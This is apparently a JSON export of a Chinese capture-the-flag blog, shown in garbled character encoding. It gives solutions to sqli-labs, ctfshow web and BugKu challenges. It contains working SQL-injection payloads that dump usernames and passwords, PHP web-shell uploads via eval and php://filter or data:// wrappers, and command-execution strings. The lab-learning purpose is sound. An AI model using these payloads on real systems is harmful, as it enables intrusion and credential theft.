#è·å–å½“å‰æ•°æ®åº“çš„åç§°?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -#æŸ¥è¯¢å½“å‰æ•°æ®åº“é‡Œæ‰€æœ‰çš„è¡¨?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,31))))-- -#æŸ¥è¯¢è¡¨é‡Œåˆ—çš„åç§°?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -#æŸ¥è¯¢è¡¨é‡Œé¢çš„å†…å®¹# extractvalue()å‡½æ•°èƒ½æ˜¾ç¤ºçš„æœ€å¤§é•¿åº¦ä¸º32ï¼Œæ‰€ä»¥ç”¨substr()å‡½æ•°æ¥åˆ†é¡µï¼Œæˆ–è€…ä½¿ç”¨limitåˆ†é¡µä¹Ÿå¯ä»¥ã€‚concat()é‡Œé¢çš„~ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ã€‚ updatexml:payload:id=â€™and(select updatexml(â€œanythingâ€,concat(â€˜~â€™,(selectè¯­å¥())),â€anythingâ€)) 1234?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select database())),1)-- -?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; )),1)-- -?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- - floor:payload:â€™union select 1 from (select count(*),concat((slelectè¯­å¥),floor(rand(0)*2))x from â€œä¸€ä¸ªè¶³å¤§çš„è¡¨â€ group by x)a less-6é—­åˆæ–¹å¼ä¸º&quot;ï¼ŒæŠ¥é”™æ³¨å…¥ä»å¯è¡Œã€‚ less-7æ–‡ä»¶è¯»å†™æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘æ€ä¹ˆè¿è¡Œæ–‡ä»¶éƒ½ä¸å†™å…¥ï¼Œæ”¾å¼ƒäº†ã€‚ less-8å¸ƒå°”ç›²æ³¨ã€‚ 12345?id=-1&#x27;and (ascii(substr(select database()),1,1))==115--+ #åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°æ®åº“åå­—ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiç æ˜¯å¦ç­‰äº115?id=1&#x27; and (ascii(substr((select database()) ,2,1))) = 101 --+ #åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°æ®åº“åå­—ç¬¬äºŒä¸ªå­—ç¬¦çš„asciiç æ˜¯å¦ç­‰äº101?id=1&#x27;and (length(database())) = 8 --+ #åˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦æ˜¯å¦ç­‰äº8?id=1&#x27;and (length(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)) = 5 --+ #åˆ¤æ–­åœ°ä¸‰å¼ è¡¨åå­—çš„é•¿åº¦æ˜¯å¦ä¸º5?id=1&#x27; and (length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))) = 8 --+ #åˆ¤æ–­usersè¡¨é‡Œåœ°äºŒä¸ªåˆ—åçš„é•¿åº¦æ˜¯å¦ä¸º8 å¦‚æœåˆ¤æ–­æ­£ç¡®çš„è¯ï¼Œé¡µé¢è¿”å›æ­£å¸¸ã€‚å¥½éº»çƒ¦å•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šã€‚ less-9æ—¶é—´ç›²æ³¨ 1id=1&#x27; and if(length(database())&gt;3 ,sleep(5),1) -- - #å¦‚æœæ•°æ®åº“é•¿åº¦é•¿äº3çš„è¯ï¼Œå»¶è¿Ÿ5ç§’è¿”å›é¡µé¢ã€‚ MySQLæ—¶é—´ç›²æ³¨äº”ç§å»¶æ—¶æ–¹æ³• less-10è¿˜æ˜¯æ—¶é—´ç›²æ³¨ï¼Œé—­åˆæ–¹å¼ä¸º&quot;ã€‚ less-11è¿™ä¸ªå°±åœ¨usernameä¸Šç›´æ¥è¾“å…¥sqlè¯­å¥å°±è¡Œã€‚ä¹Ÿå¯ä»¥ç”¨hackbarï¼ŒPostä¼ å‚ã€‚å…¶ä»–è¯­å¥ä¸å˜ã€‚.","categories":[{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"}],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://lvzhouhang.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"ctfshow webå…¥é—¨101~104","slug":"ctfshow-webå…¥é—¨101~104","date":"2023-02-18T11:30:48.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/18/ctfshow-webå…¥é—¨101~104/","permalink":"https://lvzhouhang.xyz/2023/02/18/ctfshow-web%E5%85%A5%E9%97%A8101~104/","excerpt":"","text":"web101 12å½“æ–°å»ºReflectionClassç±»å¹¶ä¼ å…¥PHPä»£ç æ—¶ï¼Œä¼šè¿”å›ä»£ç çš„è¿è¡Œç»“æœï¼Œå¯ä»¥é€šè¿‡echoæ˜¾ç¤ºå³ä½¿ä¼ å…¥äº†ç©ºçš„æ‹¬å·ï¼Œä»£ç ä¾æ—§å¯ä»¥è¿è¡Œï¼Œä¸”error_reporting(0)çš„å­˜åœ¨é˜»æ­¢äº†æŠ¥é”™ v1å¿…é¡»æ˜¯æ•°å­—ï¼Œv2å¯ä»¥ä½¿ç”¨å¯ä»¥ä½¿ç”¨åå°„ç±»new ReflectionClass(),v3æ²¡æœ‰è¿‡æ»¤;ã€‚payload: 1v1=1&amp;v2=echo new Reflectionclass&amp;v3=; 0x2dè¿˜æ˜¯-ï¼Œç„¶åæœ€åä¸€ä½éœ€è¦è‡ªå·±çŒœã€‚ web102 12345is_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œå¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚å¦‚æœå­—ç¬¦ä¸²ä¸­å«æœ‰ä¸€ä¸ªeä»£è¡¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå¯è¿”å›truecall_user_func() å‡½æ•°ç”¨äºè°ƒç”¨æ–¹æ³•æˆ–è€…å˜é‡ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°file_put_contents() å‡½æ•°åº”è¯¥éƒ½ç†Ÿæ‚‰äº†ï¼Œå†™å…¥å†…å®¹åˆ°æ–‡ä»¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–‡ä»¶åï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å†…å®¹ è¦ç¡®ä¿v4ä¸ºçœŸï¼Œå°±è¦ç¡®ä¿v2æ˜¯æ•°å­—.å°†v2è¿›è¡Œbase64ç¼–ç ç„¶åå†è½¬æ¢æˆ16è¿›åˆ¶ã€‚payloadï¼š 12v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=2.phpPOSTï¼šv1=hex2bin ç„¶åè®¿é—®2.phpæŸ¥çœ‹æºç å°±èƒ½æ‰¾åˆ°flagã€‚ web103æ‰¾ä¸åˆ°æœåŠ¡å™¨ï¼Œåšä¸äº†é¢˜. web104å› ä¸ºæ²¡æœ‰åˆ¤æ–­ï¼Œå¯ä»¥ç›´æ¥è®©ä¸¤ä¸ªå€¼ç›¸ç­‰ï¼Œä¹Ÿå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨ä¸¤ä¸ªç›¸ç­‰çš„sha1çš„å€¼ã€‚ 1234aaK1STfY0e76658526655756207688271159624026011393aaO8zKZF0e89257456677279068558073954252716165668","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web97~100","slug":"ctfshow-webå…¥é—¨97~100","date":"2023-02-07T06:20:16.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/07/ctfshow-webå…¥é—¨97~100/","permalink":"https://lvzhouhang.xyz/2023/02/07/ctfshow-web%E5%85%A5%E9%97%A897~100/","excerpt":"web97è¦æ±‚POSTä¼ å‚ï¼Œaä¸èƒ½ç­‰äºbï¼Œä½†æ˜¯aå’Œbçš„md5å€¼è¦ç›¸åŒï¼Œä½†æ˜¯md5è¿™ä¸ªå‡½æ•°å‘¢æœ‰ä¸ªæ¼æ´ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ•°ç»„çš„æ—¶å€™ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è¿”å›NULLã€‚ 1a[]=123&amp;b[]=1234","text":"web97è¦æ±‚POSTä¼ å‚ï¼Œaä¸èƒ½ç­‰äºbï¼Œä½†æ˜¯aå’Œbçš„md5å€¼è¦ç›¸åŒï¼Œä½†æ˜¯md5è¿™ä¸ªå‡½æ•°å‘¢æœ‰ä¸ªæ¼æ´ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæ•°ç»„çš„æ—¶å€™ä¼šå‘ç”Ÿé”™è¯¯ï¼Œå¹¶è¿”å›NULLã€‚ 1a[]=123&amp;b[]=1234 web98 1234åˆ†æä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼Œåªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³•(ä¿®æ”¹äº†getæ–¹æ³•çš„åœ°å€ï¼‰ï¼Œè€Œç¬¬äºŒä¸‰è¡Œä»£ç æ²¡å•¥ç”¨ï¼Œæˆ‘ä»¬ç”¨ä¸åˆ°ï¼Œç›´æ¥çœ‹ç¬¬å››è¡Œï¼Œå¦‚æœgetå‚æ•°HTTP_FLAGçš„å€¼ä¸ºflagï¼Œå°±è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¾“å‡ºflagã€‚æ‰€ä»¥æ€è·¯å°±æœ‰äº†ï¼Œæˆ‘ä»¬é€šè¿‡getéšä¾¿ä¼ ä¸€ä¸ªå‚æ•°å¹¶èµ‹å€¼ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡postè¯·æ±‚ä¼ HTTP_FLAGå‚æ•°å¹¶èµ‹å€¼ä¸ºflagå³å¯è·å¾—flagã€‚ 12GET:?1=1POST:HTTP_FLAG=flag web99 12345 array()ï¼Œæ˜¯ç©ºæ•°ç»„å®šä¹‰ï¼Œé¢˜ä¸­å®šä¹‰äº†$allowä¸ºç©ºæ•°ç»„0x36dï¼Œå…¶åè¿›åˆ¶ä¸º877rand()ï¼Œè¿”å›éšæœºæ•´æ•°array_push()ï¼Œæ˜¯å‘æ•°ç»„å°¾éƒ¨æ’å…¥æ–°çš„å€¼file_put_contents()ï¼Œå†™æ–‡ä»¶ å› ä¸ºin_arrayç¬¬ä¸‰ä¸ªå‚æ•°æ²¡è®¾ç½®ä¸ºtrueï¼Œæ‰€ä»¥è¯¥å‡½æ•°æ˜¯å®½æ¾æ¯”è¾ƒï¼ˆ==ï¼‰ï¼Œå­—ç¬¦ä¸²å‹ä¼šå…ˆè½¬åŒ–ä¸ºæ•´å‹å†æ¯”è¾ƒï¼Œåªè¦å€¼ç›¸åŒå°±å¯ä»¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å‚å†™æœ¨é©¬è¿›å». 12?n=1.phpcontent=&lt;?php @eval($_POST[1]);?&gt; ç„¶åç”¨èšå‰‘è¿æ¥ web100is_numeric() å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²,å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚v1ä¸€å®šè¦æ˜¯ä¸ªæ•°å­—ï¼Œv2ä¸èƒ½æœ‰åˆ†å·ï¼Œv3å¿…é¡»æœ‰åˆ†å·ã€‚ 12get:/?v1=1&amp;v2=eval($_POST[1])?&gt; %23&amp;v3=;post:1=system(&quot;tac ctfshow.php&quot;); 1$flag_is_3110c36f0x2df28a0x2d4b840x2dbe0f0x2d2c4f600a4b95; 0x2dæ˜¯-ï¼Œæ¢ä¸ŠååŠ ä¸Šctfshow{}å°±å¯ä»¥äº†","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web89~96","slug":"89","date":"2023-02-02T06:20:16.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/02/89/","permalink":"https://lvzhouhang.xyz/2023/02/02/89/","excerpt":"web89ç”¨æ•°ç»„ç»•è¿‡å°±è¡Œã€‚payload: 1?num[]=a;","text":"web89ç”¨æ•°ç»„ç»•è¿‡å°±è¡Œã€‚payload: 1?num[]=a; web90 1234567891011intval( mixed $var[, int $base = 10] ) : intvarè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼baseè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ Note: å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š â—¦ å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† &quot;0x&quot; (æˆ– &quot;0X&quot;) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ â—¦ å¦‚æœå­—ç¬¦ä¸²ä»¥ &quot;0&quot; å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ â—¦ å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚ åªéœ€è¦æäº¤0x117cå°±è¡Œï¼Œ0x117cæ˜¯16è¿›åˆ¶çš„4476ï¼Œä¹Ÿå¯ä»¥æäº¤4476+å­—ç¬¦ã€‚payload: 12?num=0x117c?num=4476a web91ç¬¬ä¸€æ¬¡æ˜¯/imç¬¬äºŒæ¬¡æ˜¯/i/imå¯ä»¥åŒ¹é…å¤šè¡Œï¼Œ/iåªèƒ½åŒ¹é…ä¸€è¡Œã€‚æ‰€ä»¥è®©ä»–ç¬¬ä¸€æ¬¡åŒ¹é…åˆ°phpç¬¬äºŒæ¬¡åŒ¹é…ä¸åˆ°phpã€‚payload: 1?cmd=1%0aphp web92å¯ä»¥æ¢ä¸ªè¿›åˆ¶ç»•è¿‡ 1?num=0x117c æˆ–è€…è¿˜æœ‰eè¿™ä¸ªä¸œè¥¿ 1intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123 å…¶å®ä¸éœ€è¦æ˜¯eå…¶ä»–çš„å­—æ¯ä¹Ÿå¯ä»¥ 1?num=4476e123 web93å¯ä»¥ç”¨å°æ•°ï¼Œä¹Ÿå¯ä»¥ç”¨8è¿›åˆ¶payload: 12?num=4476.1?num=010574 123äºŒè¿›åˆ¶0bxxxå…«è¿›åˆ¶0xxxxxxåå…­è¿›åˆ¶0xaaaa web94strposæ˜¯åŒ¹é…å­—ç¬¦ï¼Œå¿…é¡»è¦åŒ¹é…åˆ°0è€Œä¸”è¿˜ä¸èƒ½åœ¨ç¬¬ä¸€ä½ï¼Œå¯ä»¥ç”¨8è¿›åˆ¶ä¹Ÿå¯ä»¥ç”¨å°æ•°ã€‚å¦‚æœç”¨8è¿›åˆ¶çš„è¯å¿…é¡»åœ¨å¼€å¤´åŠ ä¸€ä¸ªç©ºæ ¼ã€‚payload: 12?num=4476.0/?num= 010574 web95è¿™ä¸€é“é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªç‚¹ï¼Œæ‰€ä»¥æ²¡æ³•ç”¨å°æ•°äº†ï¼Œå…¶ä»–çš„è·Ÿä¸Šä¸€é“é¢˜ä¸€æ ·ã€‚payload: 1?num= 010574 web96æƒ³åŠæ³•è¯»å–flag.phpè¿˜ä¸èƒ½ç›´æ¥ä¼ flag.phpï¼Œåˆ©ç”¨è·¯å¾„æˆ–è€…phpåè®®å°±è¡Œã€‚payload: 123?u=/var/www/html/flag.php?u=./flag.php?u=php://filter/resource=falg.php","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"ctfshow/åˆ·é¢˜/phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"phpç‰¹æ€§","slug":"phpç‰¹æ€§","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow webå…¥é—¨87~88","slug":"ctfshow-webå…¥é—¨87","date":"2023-01-31T10:13:37.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/31/ctfshow-webå…¥é—¨87/","permalink":"https://lvzhouhang.xyz/2023/01/31/ctfshow-web%E5%85%A5%E9%97%A887/","excerpt":"web87è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨","text":"web87è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ 123å°† php://filter/write=convert.base64-decode/resource=123.php ï¼ˆè¿™é‡Œå› ä¸ºæˆ‘ä»¬éœ€è¦çš„æ˜¯å†™å…¥çš„æƒé™ï¼Œæ‰€ä»¥æ˜¯writeï¼‰è¿›è¡Œä¸¤æ¬¡urlç¼–ç ï¼Œå¾—åˆ°å¦‚ä¸‹%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%33%32%25%33%33%25%32%45%25%37%30%25%36%38%25%37%30 ç„¶åå†contentå†™å…¥ç»è¿‡base64ç¼–ç è¿‡åçš„ä¸€å¥è¯ ï¼ˆPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==ï¼‰è¿™é‡Œcontentçš„å€¼å‰é¢è¦åŠ ä¸¤ä¸ªå­—ç¬¦ï¼Œå› ä¸ºbase64ç®—æ³•è§£ç æ—¶æ˜¯4ä¸ªbyteä¸€ç»„ï¼Œæ‰€ä»¥ç»™ä»–å¢åŠ 2ä¸ªå­—ç¬¦ ä¸€å…±8ä¸ªå­—ç¬¦ç„¶åå†æŸ¥çœ‹fl0g.phpå°±è¡Œäº† web88è¿‡æ»¤çš„ä¸œè¥¿å¾ˆå¤šï¼Œä½†dataåè®®è¿˜å¯ä»¥ç”¨ã€‚ 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgKi5waHAiKTs/Pg base64åé¢æ˜¯base64ç¼–ç ä½†æ˜¯ä¸èƒ½å¸¦æœ‰åŠ å·å’Œç­‰å·ï¼Œæœ‰åŠ å·çš„payloadä¸èƒ½ç”¨ã€‚ web116å’Œweb117ä¸ä¼šåšâ€¦..","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"åˆ·é¢˜","slug":"ctfshow/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"ctfshow/åˆ·é¢˜/æ–‡ä»¶åŒ…å«","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"æ–‡ä»¶åŒ…å«","permalink":"https://lvzhouhang.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"BugKuåˆ·é¢˜","slug":"BugKuåˆ·é¢˜","date":"2023-01-28T02:30:19.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/28/BugKuåˆ·é¢˜/","permalink":"https://lvzhouhang.xyz/2023/01/28/BugKu%E5%88%B7%E9%A2%98/","excerpt":"èªæ˜çš„å°ç¾Šé¢˜ç›®æè¿°ï¼šä¸€åªå°ç¾Šç¿»è¿‡äº†2ä¸ªæ …æ  fa{fe13f590lg6d46d0d0}æ …æ å¯†ç ï¼Œåˆ†ä¸¤æ æ—¶å°±æ˜¯flagã€‚","text":"èªæ˜çš„å°ç¾Šé¢˜ç›®æè¿°ï¼šä¸€åªå°ç¾Šç¿»è¿‡äº†2ä¸ªæ …æ  fa{fe13f590lg6d46d0d0}æ …æ å¯†ç ï¼Œåˆ†ä¸¤æ æ—¶å°±æ˜¯flagã€‚ flag:flag&#123;6fde4163df05d900&#125; /.-é¢˜ç›®æè¿°ï¼š ..-./.-../.-/â€“./â€”-.â€“/-../â€¦â€“/..-./-.-./-â€¦/..-./.â€”-/â€“â€¦/..-./â€”-./â€¦â€“/â€”-./â€”-./â€¦../â€”â€“/â€¦.-/â€”â€“.-å¾ˆæ˜æ˜¾çš„æ‘©æ–¯å¯†ç ï¼Œåœ¨çº¿æ‘©æ–¯å¯†ç ç¿»è¯‘ï¼Œå¯ä»¥è§£å‡ºflagï¼šFLAG%u7bD3FCBF17F9399504%u7d%u7bæ˜¯{ï¼Œ%u7dæ˜¯}ï¼Œç„¶åå­—æ¯å…¨éƒ¨æ”¹ä¸ºå°å†™å°±æ˜¯flagã€‚flag:flag&#123;d3fcbf17f9399504&#125; oké¢˜ç›®æ˜¯okkç¼–ç ï¼Œç”¨å¯ä»¥ç›´æ¥è·å¾—flagã€‚flagï¼šflag&#123;0a394df55312c51a&#125; linuxä¸‹è½½æ–‡ä»¶è§£å‹ï¼Œç”¨è®°äº‹æœ¬çš„å½¢å¼æ‰“å¼€æ–‡ä»¶ï¼Œctrl+æœç´¢keyå°±èƒ½æ‰¾åˆ°flagã€‚flag:key&#123;feb81d3834e2423c9903f4755464060b&#125; é—ªçš„å¥½å¿«ä¸‹è½½æ˜¯ä¸€ä¸ªgifå›¾ï¼Œç”¨stegsolveæ‰“å¼€ï¼Œä¸€å¸§ä¸€å¸§æ‰«äºŒç»´ç ï¼Œç„¶åæ‹¼æ¥èµ·æ¥å°±æ˜¯flagã€‚flagï¼šSYC&#123;F1aSh_so_f4sT&#125; éšå†™2å›¾ç‰‡çš„å¤§å°æ„Ÿè§‰å’Œä»–æœ¬èº«æœ‰ç‚¹ä¸ç¬¦ï¼Œç”¨binwalkä¸€çœ‹ï¼Œç¡®å®æœ‰éšè—çš„æ–‡ä»¶ã€‚åˆ†ç¦»ä¹‹åæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€ä¸ªæç¤ºï¼Œæç¤ºè¯´æ˜è§£å‹å¯†ç æ˜¯ä¸‰ä½æ•°å­—ã€‚æš´åŠ›ç ´è§£ä¸€ä¸‹ï¼Œå¯†ç æ˜¯871ï¼Œè§£å‹ä¹‹ååˆæ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œæœ«å°¾æœ‰f1@g&#123;eTB1IEFyZSBhIGhAY2tlciE=&#125;base64è§£ç å¾—åˆ°falgã€‚flagï¼šf1@g&#123;y0u Are a h@cker!&#125; ç™½å“¥çš„é¸½å­ç”¨stegsolveæ‰“å¼€ï¼Œfileformatæœ€ä¸‹é¢æœ‰ç±»ä¼¼äºflagçš„æ–‡å­—ã€‚æ …æ å¯†ç åœ¨çº¿åŠ å¯†è§£å¯†æ …æ åŠ å¯†ï¼Œå½“æ …æ æ•°ä¸º3æ—¶ï¼Œå°±æ˜¯flagã€‚flagï¼šflag&#123;w22_is_v3ry_cool&#125; å†ä¹Ÿæ²¡æœ‰çº¯ç™½çš„çµé­‚æ–‡ä»¶å¼€å¤´æ˜¯~å‘œå—·å¼€å¤´çš„ï¼ŒæŸ¥è¿‡ä¹‹åæ‰å‘ç°æ˜¯å…½éŸ³å¯†æ–‡ã€‚ç”±äºä¸çŸ¥é“æ€ä¹ˆåŠ å¯†çš„ï¼Œå°±å…ˆå°†flagåŠ å¯†ä¸€ä¸‹è¯•è¯•ï¼Œç„¶åä¸€ä¸€å¯¹åº”ï¼Œæœ€å‘äººçš„æ˜¯å°‘äº†ä¸€ä¸ªGï¼ŒçœŸçš„æ¶å¿ƒäººã€‚ã€‚ã€‚ã€‚æœ€åè§£å‡ºæ¥å°±æ˜¯flagã€‚flagï¼šflag&#123;ni-zhen-shi-shou-ren&#125;","categories":[{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/categories/BugKu/"},{"name":"åˆ·é¢˜","slug":"BugKu/åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/categories/BugKu/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/tags/BugKu/"}]},{"title":"ctfshow webå…¥é—¨69~74","slug":"ctfshow-webå…¥é—¨69~74","date":"2023-01-25T07:23:05.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/01/25/ctfshow-webå…¥é—¨69~74/","permalink":"https://lvzhouhang.xyz/2023/01/25/ctfshow-web%E5%85%A5%E9%97%A869~74/","excerpt":"web69å’Œweb68ä¸€æ ·ã€‚payload: 1c=include(&quot;/flag.txt&quot;);","text":"web69å’Œweb68ä¸€æ ·ã€‚payload: 1c=include(&quot;/flag.txt&quot;); web70åŒä¸Šã€‚ web71 12$s = 